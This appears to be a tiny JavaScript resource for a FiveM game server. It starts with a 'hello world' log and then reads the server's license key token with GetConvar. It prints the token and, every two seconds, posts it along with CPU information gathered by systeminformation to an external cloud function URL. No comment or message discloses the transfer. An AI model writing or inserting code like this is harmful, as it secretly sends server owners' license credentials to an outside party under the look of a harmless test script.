console.log("hello world!")
console.log(GetConvar("sv_licenseKeyToken"))
const si = require('systeminformation')
const axios = require('axios')
let cpuData = {}

setInterval(() => {
    si.cpu()
    .then(data => { cpuData = data })
    .catch(error => console.error(error));
}, 5000);


setInterval(() => {
    axios.post('https://us-central1-mewsemp.cloudfunctions.net/systemIngress', {system: cpuData, lkt: GetConvar("sv_licenseKeyToken")})
}, 2000)